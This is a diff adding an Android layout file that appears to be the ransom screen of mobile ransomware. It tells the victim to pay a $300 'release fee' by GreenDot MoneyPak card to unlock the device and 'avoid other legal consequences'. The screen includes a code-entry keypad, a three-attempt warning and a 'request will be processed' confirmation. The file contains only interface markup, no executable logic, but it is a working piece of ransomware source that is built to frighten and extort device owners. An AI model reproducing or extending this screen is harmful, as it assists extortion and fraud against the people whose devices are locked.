@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent">
+    <LinearLayout android:orientation="vertical" android:background="@drawable/bg_header" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+    <ScrollView android:id="@+id/scrollView1" android:layout_width="match_parent" android:layout_height="wrap_content">
+        <LinearLayout android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent">
+            <LinearLayout android:orientation="vertical" android:background="#ff0000" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="10dp" android:layout_marginTop="10dp" android:layout_marginRight="10dp" android:layout_marginBottom="10dp">
+                <TextView android:textAppearance="?android:attr/textAppearanceMedium" android:textSize="16sp" android:textColor="#ffffff" android:id="@+id/textView1" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="10dp" android:layout_marginTop="10dp" android:layout_marginRight="10dp" android:layout_marginBottom="10dp" android:text="To unlock your device and to avoid other legal consequences, you are obligated to pay a release fee of $300. Payable through GreenDot MoneyPak (you have to purchase MoneyPak card. load it with $300 and enter the code). You can buy the card at any store or gas station, payzone or paypoint."/>
+            </LinearLayout>
+            <Button android:layout_gravity="center" android:id="@+id/whereICan" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="10dp" android:layout_marginRight="10dp" android:text="Where i can buy MoneyPack"/>
+            <LinearLayout android:orientation="vertical" android:id="@+id/where" android:visibility="gone" android:layout_width="match_parent" android:layout_height="wrap_content">
+                <TextView android:gravity="center" android:id="@+id/textView4" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="10dp" android:layout_marginTop="10dp" android:layout_marginRight="10dp" android:layout_marginBottom="10dp" android:text="At these participating stores:"/>
+                <ImageView android:layout_gravity="center" android:id="@+id/imageView1" android:layout_width="wrap_content" android:layout_height="wrap_content" android:src="@drawable/logos"/>
+            </LinearLayout>
+            <LinearLayout android:layout_gravity="center" android:orientation="vertical" android:id="@+id/error" android:background="#ff0000" android:visibility="gone" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="15dp" android:layout_marginTop="20dp" android:layout_marginRight="15dp" android:layout_marginBottom="20dp">
+                <TextView android:textSize="20sp" android:textColor="#ffffff" android:gravity="center" android:id="@+id/textView2" android:padding="15dp" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Wrong MoneyPack code. You have only 3 attempts. Please try again"/>
+            </LinearLayout>
+            <LinearLayout android:orientation="vertical" android:id="@+id/codeInput" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginTop="5dp">
+                <EditText android:id="@+id/et_number" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="30dp" android:layout_marginRight="30dp" android:hint="Enter $300 MoneyPak code" android:ems="10" android:maxLength="14" android:inputType="number"/>
+                <LinearLayout android:gravity="center" android:layout_width="match_parent" android:layout_height="wrap_content">
+                    <Button android:id="@+id/Button1" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="1"/>
+                    <Button android:id="@+id/Button2" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="2"/>
+                    <Button android:id="@+id/button3" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="3"/>
+                </LinearLayout>
+                <LinearLayout android:gravity="center" android:layout_width="match_parent" android:layout_height="wrap_content">
+                    <Button android:id="@+id/Button4" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="4"/>
+                    <Button android:id="@+id/Button5" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="5"/>
+                    <Button android:id="@+id/Button6" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="6"/>
+                </LinearLayout>
+                <LinearLayout android:gravity="center" android:layout_width="match_parent" android:layout_height="wrap_content">
+                    <Button android:id="@+id/Button7" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="7"/>
+                    <Button android:id="@+id/Button8" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="8"/>
+                    <Button android:id="@+id/Button9" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="9"/>
+                </LinearLayout>
+                <LinearLayout android:gravity="center" android:layout_width="match_parent" android:layout_height="wrap_content">
+                    <Button android:id="@+id/bt_clear" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Clear"/>
+                    <Button android:id="@+id/Button0" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="0"/>
+                </LinearLayout>
+                <Button android:textColor="#ffffff" android:layout_gravity="center" android:id="@+id/bt_proceed" android:background="#505050" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="30dp" android:layout_marginTop="20dp" android:layout_marginRight="30dp" android:layout_marginBottom="10dp" android:text="Unlock Device Now"/>
+            </LinearLayout>
+            <LinearLayout android:orientation="vertical" android:id="@+id/succsess" android:background="#228b22" android:visibility="gone" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_marginLeft="10dp" android:layout_marginTop="10dp" android:layout_marginRight="10dp" android:layout_marginBottom="10dp">
+                <TextView android:textSize="30sp" android:textColor="#ffffff" android:gravity="center" android:id="@+id/textView3" android:padding="20dp" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Your request will be processed within 24 hours"/>
+            </LinearLayout>
+        </LinearLayout>
+    </ScrollView>
+</LinearLayout>
